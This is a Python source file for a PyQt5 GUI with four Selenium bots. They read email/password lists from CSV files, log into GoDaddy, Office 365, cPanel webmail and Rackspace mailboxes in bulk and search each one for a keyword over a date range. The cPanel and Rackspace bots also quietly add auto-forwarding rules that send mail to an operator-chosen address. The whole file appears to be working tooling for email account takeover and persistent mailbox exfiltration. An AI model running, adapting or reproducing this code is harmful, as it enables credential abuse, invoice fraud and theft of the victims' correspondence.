from multiprocessing import freeze_support
freeze_support()
#to avoid the error

from optparse import Option
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.select import Select
from selenium.webdriver.common.keys import Keys
import undetected_chromedriver as uc
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager


#imported the selenium modules

from PyQt5.QtWidgets import QDialog,QApplication,QWidget
from PyQt5.uic import loadUi
from PyQt5 import QtWidgets,QtCore
from PyQt5.QtGui import QIcon
import threading
import random
import time
import csv
import sys


import qrc.res,qrc.office365,qrc.email_qrc,qrc.emailforwarder_qrc

##Functions/Variables For 1st bot godaddy

def delay(start,end):
    time.sleep(int(random.randint(start,end)))
chrome_options = webdriver.ChromeOptions()

def startCheckingEmails_goddady():
  
    sitesinformation=[]
    with open("csv files/godaddy_sites.csv","r",encoding="utf-8") as f:
        for i in csv.reader(f):
            sitesinformation.append(i)
    driver = webdriver.Chrome()
    driver.maximize_window()
    for site in sitesinformation:
        try:
            globals()['waiting_godaddy']=True
            keyword=globals()['keyword_godaddy']
            startdate=globals()['startdate_godaddy']
            enddate=globals()['enddate_godaddy']
            months_=['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov','Dec']
            if(startdate.day()<10):
                stday="0"+str(startdate.day())
            else:
                stday=str(startdate.day())
            if(enddate.day()<10):
                enday="0"+str(enddate.day())
            else:
                enday=str(enddate.day())
            startingdate=[str(startdate.year()),months_[startdate.month()-1],stday]
            endingdate = [str(enddate.year()),months_[enddate.month()-1],enday]
            
            
            print(site)
            driver.get("https://sso.secureserver.net/?app=email&realm=pass&")
            delay(1,4)
            driver.find_element(By.ID,"username").send_keys(site[0])
            driver.find_element(By.ID,"password").send_keys(site[1])
            delay(1,3)
            driver.find_element(By.ID,"submitBtn").click()
            time.sleep(7)
            try:
                driver.execute_script('document.getElementById("go-to-app-link").click()')
            except Exception as err:
                
                pass
            time.sleep(7)
            
                
            try:
                driver.find_element(By.ID,"classic_view").click()
            except:
                pass

            delay(1,4)
            driver.find_element(By.ID,"search_box").find_element(By.TAG_NAME,"a").click()
            delay(1,3)
            driver.find_elements(By.CLASS_NAME,"content")[3].send_keys(keyword)
            time.sleep(8)

            select_tag=driver.find_elements(By.TAG_NAME,"select")[4]
            select_tag.send_keys(Keys.CONTROL,"a")
            
           
           

            startingMonth = Select(driver.find_element(By.XPATH,'//*[@id="div_advancedsearch_body"]/form/table/tbody/tr/td/table/tbody/tr[3]/td[2]/table/tbody/tr[1]/td[4]/table/tbody/tr[6]/td[2]/select[1]'))
            startingDay = Select(driver.find_element(By.XPATH,'//*[@id="div_advancedsearch_body"]/form/table/tbody/tr/td/table/tbody/tr[3]/td[2]/table/tbody/tr[1]/td[4]/table/tbody/tr[6]/td[2]/select[2]'))
            startingYear = Select(driver.find_element(By.XPATH,'//*[@id="div_advancedsearch_body"]/form/table/tbody/tr/td/table/tbody/tr[3]/td[2]/table/tbody/tr[1]/td[4]/table/tbody/tr[6]/td[2]/select[3]'))
            endingMonth = Select(driver.find_element(By.XPATH,'//*[@id="div_advancedsearch_body"]/form/table/tbody/tr/td/table/tbody/tr[3]/td[2]/table/tbody/tr[1]/td[4]/table/tbody/tr[7]/td[2]/select[1]'))
            endingDay = Select(driver.find_element(By.XPATH,'//*[@id="div_advancedsearch_body"]/form/table/tbody/tr/td/table/tbody/tr[3]/td[2]/table/tbody/tr[1]/td[4]/table/tbody/tr[7]/td[2]/select[2]'))
            endingYear = Select(driver.find_element(By.XPATH,'//*[@id="div_advancedsearch_body"]/form/table/tbody/tr/td/table/tbody/tr[3]/td[2]/table/tbody/tr[1]/td[4]/table/tbody/tr[7]/td[2]/select[3]'))

            startingYear.select_by_visible_text(startingdate[0])
            
            time.sleep(0.8)
            startingMonth.select_by_visible_text(startingdate[1])
            time.sleep(0.8)
            startingDay.select_by_visible_text(startingdate[2])
            time.sleep(0.8)
            endingYear.select_by_visible_text(endingdate[0])
            time.sleep(0.8)
            endingMonth.select_by_visible_text(endingdate[1])
            time.sleep(0.8)
            endingDay.select_by_visible_text(endingdate[2])

            time.sleep(7)
            driver.find_element(By.XPATH,'//*[@id="div_advancedsearch_body"]/form/table/tbody/tr/td/table/tbody/tr[3]/td[2]/table/tbody/tr[2]/td[5]/span/button').click()

            while True:
                try:
                    if(globals()['waiting_godaddy']==False):
                        
                        break
                    if("There are no messages to display." in driver.find_element(By.ID,"tbody_mailindex").text):
                        break
                except Exception as err:
                    print(err)
                    pass
            driver.delete_all_cookies()
            time.sleep(10)
        except Exception as err:
              
            driver.delete_all_cookies()
            time.sleep(8)
            pass

       
#####################----------->bot 1 data end

##########FUNCTIONS/VARIABLES FOR THE 2 BOT(OFFICE 365)

#imported the pyqt5(gui) module and other req module
frech_monthShort=['','Jan','Fév','Mar','Avr','Mai','Juin','Juil','Août','Sep','Oct','Nov','Déc']
frech_monthlong=['',"janvier","février","mars","avril","mai" ,"juin" ,"juillet" ,"août" ,"septembre" ,"octobre" ,"novembre","décembre"]
english_monthlong=['', 'January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
english_monthShort=['', 'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov','Dec']
# driver = uc.Chrome()



def changedate(driver,index,month,day,year):
                                          
    driver.find_elements(By.CLASS_NAME,"ms-TextField-fieldGroup")[index+2].click()
    time.sleep(1)
    dateEditor=driver.find_element(By.CLASS_NAME,"ms-DatePicker-callout")
    btns=dateEditor.find_elements(By.TAG_NAME,"button")
    for btn in btns:
        try:
            if("monthAndYear" in btn.get_attribute("class")):
                btn.click()
        except:
            pass
    
    btns=dateEditor.find_elements(By.TAG_NAME,"button")
    for btn in btns:
        if("currentItemButton" in btn.get_attribute('class')):
            curr_year=int(btn.text)
            break
    indexingofyear=curr_year
    while(indexingofyear<year):
        
        btns=dateEditor.find_elements(By.TAG_NAME,"button")
        for btn in btns:
            if("Go to next year" in btn.get_attribute('title')):
                btn.click()
                break
            if("Atteindre l’année suivante" in btn.get_attribute("title")):
                btn.click()
                break
        indexingofyear+=1
    indexingofyear=year
    
    while(curr_year>indexingofyear):
      
        btns=dateEditor.find_elements(By.TAG_NAME,"button")
        for btn in btns:
            if("Go to previous year" in btn.get_attribute('title')):
                btn.click()
                break
            if("Atteindre l’année précédente" in btn.get_attribute("title")):
                btn.click()
                break
        indexingofyear+=1
    btns=dateEditor.find_elements(By.TAG_NAME,"button")
    for btn in btns:
        print(frech_monthShort[month])
        print(btn.text)
        if(frech_monthShort[month] in btn.text):
            btn.click()
            break
        if(english_monthShort[month] in btn.text):
            btn.click()
            break
    btns=dateEditor.find_elements(By.TAG_NAME,"button")
    for btn in btns:
        if("dayButton" in btn.get_attribute("class")):
            class_dates=btn.get_attribute("class")
            break


    dates=dateEditor.find_elements(By.CLASS_NAME,class_dates)
    for date in dates:
        if(f"{day},{english_monthlong[month]},{year}" in date.get_attribute("aria-label").replace(" ","")):
            date.click()
            break
        if(f"{day},{frech_monthlong[month]},{year}" in date.get_attribute("aria-label").replace(" ","")):
            date.click()
            break

    #

    # btns=driver.find_elements(By.TAG_NAME,"button")
    # for btn in btns:
    #     if("itemButton" in btn.get_attribute("class")):
    #         monthly_class=btn.get_attribute("class")
    #         break

    # month_btns=driver.find_element(By.CLASS_NAME,monthly_class)
    # time.sleep(0.5)
    # month_btns[0].click()

    # driver.find_element(By.CLASS_NAME,"")
    

# LOGIN PROCESS START HERE -->
def startCheckingEmails_office365():
    emails=[]
    with open("csv files/office365_sites.csv","r",encoding="utf-8") as f:
        for i in csv.reader(f):
            emails.append(i)
  

    
    for email in emails:
        try:
            driver = webdriver.Chrome()

            driver.maximize_window()  
            globals()['waiting_office365']=True
            keyword=globals()['keyword_office365']
            startdate=globals()['startdate_office365']
            enddate=globals()['enddate_office365']
            
            driver.get("https://outlook.office365.com/")
            time.sleep(3)
            driver.find_element(By.ID,"i0116").send_keys(email[0])
            time.sleep(2)

            driver.find_element(By.ID,"idSIButton9").click()
            time.sleep(3)
            try:
                driver.find_element(By.ID,"aadTile").click()
            except:
                pass
            time.sleep(2)
            while True:
                try:
                    if(driver.find_element(By.ID,'loginHeader').text=="Enter password"):
                        break
                except:
                    break
            try:
                driver.find_element(By.ID,"i0118").send_keys(email[1])
                time.sleep(0.5)
                driver.find_element(By.ID,"idSIButton9").click()
            
                time.sleep(3)
            except:
                time.sleep(1)
                driver.find_element(By.ID,"password").send_keys(email[1])
                time.sleep(1)
                driver.find_element(By.ID,'submitBtn').click()
                time.sleep(2)
                try:
                    driver.find_element(By.ID,"go-to-app-link").click()
                    time.sleep(2)
                except:
                    pass


            
            driver.find_element(By.ID,"KmsiCheckboxField").click()
            time.sleep(2)
            driver.find_element(By.ID,"idSIButton9").click()
            # sending keyword
         
            
            while True:
                try:
                    driver.find_element(By.TAG_NAME,"input").click()
                    time.sleep(0.5)
                    driver.find_element(By.ID,"filtersButtonId").click()
                    time.sleep(1)
                    # driver.find_element(By.ID,"Keywords-ID").click
                    driver.find_elements(By.CLASS_NAME,"ms-TextField-fieldGroup")[1].click()
                    time.sleep(1)
                    break
                except Exception as err:
                    print(err)
                    pass
            try:
                driver.find_element(By.ID,"Keywords-ID").send_keys(keyword)
            except:
                driver.find_element(By.ID,"Mots clés-ID").send_keys(keyword)
            # driver.find_elements(By.CLASS_NAME,"ms-TextField-fieldGroup")[1].send_keys("invoices")
            time.sleep(1)
            driver.find_elements(By.CLASS_NAME,"ms-TextField-fieldGroup")[0].click()
            time.sleep(1)
            

            changedate(driver,0,int(startdate.month()),int(startdate.day()),int(startdate.year()))
            time.sleep(1)
            changedate(driver,1,int(enddate.month()),int(enddate.day()),int(enddate.year()))
            time.sleep(1)
            driver.find_element(By.CLASS_NAME,"ms-Checkbox-checkbox").click()
            time.sleep(0.5)
            
            time.sleep(0.5)
            

            driver.find_element(By.CLASS_NAME,"ms-Button--primary").click()
            while(globals()['waiting_office365']):
                if("We didn't find anything." in driver.find_element(By.ID,"app").text):
                    break
                pass
          

            driver.close()
        except Exception as err:
            try:
                driver.close()
            except Exception as err1:
                
                pass

            
           
       
            
########## DATA FOR THE SECOND BOT IS END---->

##FUNCTON/VATRIBALE FOR THE THIRD BOT(EMAIL FORWARDER)

def startCheckingEmails_emailforwarer():
    emails_detail=[]
    with open("csv files/forwarder_sites.csv","r",encoding="utf-8") as f:
        for i in csv.reader(f):
            emails_detail.append(i)
    driver = webdriver.Chrome()

    for email_ in emails_detail:
        try:
            email=email_[0]
            site=email_[0].split("@")[1]+"/webmail"
            password=email_[1]
            driver.get("https://"+site)
            #waiting till find an element
            globals()["waiting_forwarder"]=True
            globals()['put_emailwaite']=True
           
            time.sleep(3)
            driver.find_element(By.ID,"user").send_keys(email)
            driver.find_element(By.ID,"pass").send_keys(password)
            driver.find_element(By.ID,"login_submit").click()
            while True:
                if(globals()["waiting_forwarder"]==False):
                    break
                elif(globals()['put_emailwaite']==False):
                    break
            if(globals()["waiting_forwarder"]==False):
                    continue
                

            
            time.sleep(3)
            try:
                driver.find_element(By.CLASS_NAME,"button-cpwebmail").click()
            except:
                pass
            time.sleep(3)
            driver.find_element(By.ID,"id_forwarders").click()
            time.sleep(2)
            driver.find_element(By.ID,"btn_AddForwarder").click()
            time.sleep(1)
            driver.find_element(By.ID,"fwdemail").send_keys(globals()['emailForwarder_email'])
            time.sleep(1)
          
            driver.find_element(By.ID,"submit").click()
            time.sleep(1)


            #now click on button

            #deleting cookies for next site login
            driver.delete_all_cookies()
            time.sleep(2)
        except Exception as err:
            print(err)

#data for fourth rackspace
            
########## DATA FOR THE SECOND BOT IS END---->
def rackspace_logout(driver):
            driver.find_element(By.CLASS_NAME,"text_dropdown").find_element(By.TAG_NAME,"a").click()
            #clicking on setting
            time.sleep(0.9)
            driver.find_element(By.CLASS_NAME,"Widgets_Menu").find_elements(By.CLASS_NAME,"item")[4].click()

def startaddingEmails_rackspace():
    emails_detail=[]
    with open("csv files/rackspace_sites.csv","r",encoding="utf-8") as f:
        for i in csv.reader(f):
            emails_detail.append(i)
    driver = webdriver.Chrome()
    driver.maximize_window()
    for email in emails_detail:
        #login credential
        #email
        try:
            driver.get("https://apps.rackspace.com/login.php")
            time.sleep(0.5)
            driver.find_element(By.ID,"user-input").send_keys(email[0])
            #pass
            driver.find_element(By.ID,"pass-input").send_keys(email[1])
            #login butont
            driver.find_element(By.ID,"login-btn-toolbar").find_element(By.TAG_NAME,"button").click()
            
            time.sleep(1.5)
            try:
                if("Username / Password incorrect" in driver.find_element(By.ID,"form-container").text):
                    continue
            except:
                pass
            #clicking skip for now

            try:
                driver.find_element(By.CLASS_NAME,"btn-link").click()
            except:
                pass

            #ADDING THE AUTOFORWARDING 
            # clicking on 3 arrows
            driver.find_element(By.CLASS_NAME,"text_dropdown").find_element(By.TAG_NAME,"a").click()
            #clicking on setting
            time.sleep(0.9)
            driver.find_element(By.CLASS_NAME,"Widgets_Menu").find_elements(By.CLASS_NAME,"item")[3].click()
            #
            time.sleep(0.8)
            driver.find_element(By.CLASS_NAME,"Email").click()
            time.sleep(1.2)
            driver.execute_script("document.getElementsByClassName('tab')[1].click()")
            time.sleep(0.7)
            driver.find_elements(By.CLASS_NAME,"tab")[1].click()
            time.sleep(0.7)
            driver.find_elements(By.CLASS_NAME,"wm_checkbox")[2].find_element(By.TAG_NAME,"input").click()
            time.sleep(0.1)
            driver.find_element(By.CLASS_NAME,"text_content").send_keys(Keys.CONTROL,"a")
            driver.find_element(By.CLASS_NAME,"text_content").send_keys(Keys.BACKSPACE)
            
            driver.find_element(By.CLASS_NAME,"text_content").send_keys(globals()['rackspace_email'])
            driver.find_element(By.ID,"SAVE_COPY").click()
            time.sleep(0.4)
            
            print("checing box is checked or no")
            print(driver.find_element(By.ID,"SAVE_COPY").is_selected())
            if(not(driver.find_element(By.ID,"SAVE_COPY").is_selected())):
                driver.find_element(By.CLASS_NAME,"btn").click()

            time.sleep(0.9)
            while True:
                if(driver.find_elements(By.CLASS_NAME,"btn")==[]):
                    break
                else:
                    pass
            time.sleep(1.5)

            rackspace_logout(driver)
            driver.delete_all_cookies()
            time.sleep(1)
        except:
            try:
                rackspace_logout(driver)
                driver.delete_all_cookies()
                time.sleep(1)
            except:
                pass
    


def startCheckingEmails_rackspace():
    emails_detail=[]
    with open("csv files/rackspace_sites.csv","r",encoding="utf-8") as f:
        for i in csv.reader(f):
            emails_detail.append(i)
    driver = webdriver.Chrome()
    driver.maximize_window()
    for email in emails_detail:
        #login credential
        #email
        try:
            globals()["waiting_rackspace"]=True
            globals()['put_emailwaite_rackspace']=True
            days_option=globals()['days_options_rackspace'].currentText()
            keyword=globals()['keyword_rackspace']
            startdate=globals()['startdate_rackspace']
            driver.get("https://apps.rackspace.com/login.php")
            time.sleep(0.5)
            driver.find_element(By.ID,"user-input").send_keys(email[0])
            #pass
            driver.find_element(By.ID,"pass-input").send_keys(email[1])
            #login butont
            driver.find_element(By.ID,"login-btn-toolbar").find_element(By.TAG_NAME,"button").click()
            
            time.sleep(1.5)
            try:
                if("Username / Password incorrect" in driver.find_element(By.ID,"form-container").text):
                    continue
            except:
                pass
            #clicking skip for now

            try:
                driver.find_element(By.CLASS_NAME,"btn-link").click()
            except:
                pass
            

            #clicking on arrow for advance
            time.sleep(1)
            driver.find_element(By.CLASS_NAME,"adv").click()
                    

            #adding keyword


            driver.find_elements(By.CLASS_NAME,"text")[5].send_keys(keyword)

            #Selecting all folders options
            options_toSelect=Select(driver.find_element(By.CLASS_NAME,"Webmail_Controls_Dropdown"))
            options_toSelect.select_by_visible_text("All Folders")
            #selecting time period

            time_period=Select(driver.find_element(By.CLASS_NAME,"date_type"))
            time_period.select_by_visible_text(days_option)

            #sending dates
            dates_required=f"{startdate.month()}/{startdate.day()}/{startdate.year()}"
            driver.find_element(By.CLASS_NAME,"date").send_keys(dates_required)

            time.sleep(1.5)
            #clicking search butont
            driver.find_elements(By.TAG_NAME,"button")[0].click()
            time.sleep(2)
            if("There are no messages found for the given search criteria." in driver.find_element(By.CLASS_NAME,"wack_Controls_Overlay").text):
                rackspace_logout(driver)
                driver.delete_all_cookies()
                time.sleep(1)
                
                continue
            time.sleep(5)
            while True:
                    if(globals()["waiting_rackspace"]==False):
                        break
                    elif(globals()['put_emailwaite_rackspace']==False):
                        break
            if(globals()["waiting_rackspace"]==False):
                    rackspace_logout(driver)
                    driver.delete_all_cookies()
                    time.sleep(1)
                    continue
            #ADDING THE AUTOFORWARDING 
            # clicking on 3 arrows
            driver.find_element(By.CLASS_NAME,"text_dropdown").find_element(By.TAG_NAME,"a").click()
            #clicking on setting
            time.sleep(0.9)
            driver.find_element(By.CLASS_NAME,"Widgets_Menu").find_elements(By.CLASS_NAME,"item")[3].click()
            #
            time.sleep(0.8)
            driver.find_element(By.CLASS_NAME,"Email").click()
            time.sleep(1.2)
            driver.execute_script("document.getElementsByClassName('tab')[1].click()")
            time.sleep(0.7)
            driver.find_elements(By.CLASS_NAME,"tab")[1].click()
            time.sleep(0.7)
            driver.find_elements(By.CLASS_NAME,"wm_checkbox")[2].find_element(By.TAG_NAME,"input").click()

            time.sleep(0.1)
            driver.find_element(By.CLASS_NAME,"text_content").send_keys(Keys.CONTROL,"a")
            driver.find_element(By.CLASS_NAME,"text_content").send_keys(Keys.Keys.BACKSPACE)
            
            driver.find_element(By.CLASS_NAME,"text_content").send_keys(globals()['rackspace_email'])
            check_box=driver.find_element(By.ID,"SAVE_COPY")
            check_box.click()
            print("checing box is checked or no")
            print(driver.find_element(By.ID,"SAVE_COPY").is_selected())
            time.sleep(0.4)
            if(not(driver.find_element(By.ID,"SAVE_COPY").is_selected())):
                driver.find_element(By.CLASS_NAME,"btn").click()
            time.sleep(0.9)
            while True:
                if(driver.find_elements(By.CLASS_NAME,"btn")==[]):
                    break
                else:
                    pass
            
            rackspace_logout(driver)
            driver.delete_all_cookies()
            time.sleep(1)
            while True:
                    if(globals()["waiting_rackspace"]==False):
                        pass
                    

        except:
            try:
                rackspace_logout(driver)
                driver.delete_all_cookies()
                time.sleep(1)
            except:
                if("/owa/" in str(driver.current_url)):
                    with open("owa emails.csv","a+",encoding="utf-8") as f:
                        csv.writer(f).writerow([email[0],email[1]])
                driver.delete_all_cookies()
                time.sleep(2)
                
class welcomeScreen(QDialog):
    def __init__(self):
        super(welcomeScreen, self).__init__()
        loadUi("gui/welcomescreen.ui",self)
        # self.setWindowIcon(QIcon("mail.ico"))
        self.webmail.clicked.connect(self.webmail_)
        self.office365.clicked.connect(self.office365_)
        self.godaddy.clicked.connect(self.godaddy_)
        self.rackspace.clicked.connect(self.rackspace_)

    def godaddy_(self):
        widget.setCurrentIndex(widget.currentIndex()+1)
    def office365_(self):
        widget.setCurrentIndex(widget.currentIndex()+2)
    def webmail_(self):
        widget.setCurrentIndex(widget.currentIndex()+3)
    def rackspace_(self):
        widget.setCurrentIndex(widget.currentIndex()+4)
        


##  class of the first bot   
  
class goddady(QDialog):
    def __init__(self):
        super(goddady, self).__init__()
        loadUi("gui/godaddy.ui",self)
     
        self.start.clicked.connect(self.processsingProgram)
        self.next.clicked.connect(self.changeVar)
        self.back.clicked.connect(self.goBack)
    def processsingProgram(self):
        startdate=self.startingdates.date()
        enddate=self.endingdates.date()
        globals()['keyword_godaddy']=self.keyword.text()
        globals()['startdate_godaddy']=startdate
        globals()['enddate_godaddy']=enddate
        t = threading.Thread(target=lambda:startCheckingEmails_goddady())
        t.daemon=True
        t.start()
    def changeVar(self):
        startdate=self.startingdates.date()
        enddate=self.endingdates.date()
        globals()['keyword_godaddy']=self.keyword.text()
        globals()['startdate_godaddy']=startdate
        globals()['enddate_godaddy']=enddate
        globals()['waiting_godaddy']=False
        print("next button is pressed")
    def goBack(self):
        widget.setCurrentIndex(widget.currentIndex()-1)

## class of the second bot
class office365(QDialog):
    def __init__(self):
        super(office365, self).__init__()
        loadUi("gui/office365.ui",self)
        self.back.clicked.connect(self.goBack)
        self.start.clicked.connect(self.process)
        self.next.clicked.connect(self.changeVar)
    def goBack(self):
        widget.setCurrentIndex(widget.currentIndex()-2)
    
        
        
    def process(self):
        startdate=self.startingdates.date()
        enddate=self.endingdates.date()
        globals()['keyword_office365']=self.keyword.text()
        globals()['startdate_office365']=startdate
        globals()['enddate_office365']=enddate
        t = threading.Thread(target=lambda:startCheckingEmails_office365())
        t.daemon=True
        t.start()
    def changeVar(self):
        startdate=self.startingdates.date()
        enddate=self.endingdates.date()
        globals()['keyword_office365']=self.keyword.text()
        globals()['startdate_office365']=startdate
        globals()['enddate_office365']=enddate
        globals()['waiting_office365']=False

## class of the third bot
class emailforwarder(QDialog):
    def __init__(self):
        super(emailforwarder, self).__init__()
        loadUi("gui/emailforwarder.ui",self)
        self.back.clicked.connect(self.goBack)
        self.start.clicked.connect(self.process)
        self.next.clicked.connect(self.changeVar)
        self.put_email.clicked.connect(self.changeVar2)
    def goBack(self):
        widget.setCurrentIndex(widget.currentIndex()-3)
   
    def process(self):
       
        globals()['emailForwarder_email']=self.email_forward.text()
        
        t = threading.Thread(target=lambda:startCheckingEmails_emailforwarer())
        t.daemon=True
        t.start()
    def changeVar(self):
        globals()['waiting_forwarder']=False
    def changeVar2(self):
        globals()['emailForwarder_email']=self.email_forward.text()
        globals()['put_emailwaite']=False

#new bot
## class of the fourth bot
class rackspaceBot(QDialog):
    def __init__(self):
        super(rackspaceBot, self).__init__()
        loadUi("gui/rackspace.ui",self)
        self.back.clicked.connect(self.goBack)
        self.start.clicked.connect(self.process)
        self.next.clicked.connect(self.changeVar)
        self.addemail.clicked.connect(self.addEmails)

        self.put_email.clicked.connect(self.changeVar2)
    def goBack(self):
        widget.setCurrentIndex(widget.currentIndex()-4)
    def addEmails(self):
        globals()['rackspace_email']=self.email_forward.text()
        t = threading.Thread(target=lambda:startaddingEmails_rackspace())
        t.daemon=True
        t.start()  
    def process(self):
        startdate=self.startingdates.date()
        globals()['keyword_rackspace']=self.keyword.text()
        globals()['startdate_rackspace']=startdate
        globals()['days_options_rackspace']=self.days_option
        globals()['rackspace_email']=self.email_forward.text()
        
        t = threading.Thread(target=lambda:startCheckingEmails_rackspace())
        t.daemon=True
        t.start()
    def changeVar(self):
        startdate=self.startingdates.date()
        globals()['waiting_rackspace']=False
        globals()['keyword_rackspace']=self.keyword.text()
        globals()['startdate_rackspace']=startdate
        globals()['days_options_rackspace']=self.days_option


    def changeVar2(self):
        globals()['rackspace_email']=self.email_forward.text()
        globals()['put_emailwaite_rackspace']=False





class login(QDialog):
    def __init__(self):
        super(login, self).__init__()
        loadUi("gui/login.ui",self)
        self.loginbtn.clicked.connect(self.loginui)

    def loginui(self):
        
        if(self.username.text()=="root" and self.password.text()=="root"):
            widget.setCurrentIndex(widget.currentIndex()+1)
        else:
            self.error.setText("*Incorrect Credentials")

   
        
    
 
        
##-------->
if __name__ == '__main__':
    app=QApplication(sys.argv)
    welcome=welcomeScreen()
    loginUI=login()
    goddady_=goddady()
    office_365=office365()
    email_forwarder=emailforwarder()
    rackspacebot=rackspaceBot()

    widget= QtWidgets.QStackedWidget()
    widget.addWidget(loginUI)
    widget.addWidget(welcome)
    

    widget.addWidget(goddady_)
    widget.addWidget(office_365)
    widget.addWidget(email_forwarder)
    widget.addWidget(rackspacebot)

    widget.setFixedWidth(675)
    widget.setFixedHeight(484)
    widget.setWindowIcon(QIcon("mail.ico"))
    widget.show()
    try:
        sys.exit(app.exec_())
    except:
        print('exiting')
    
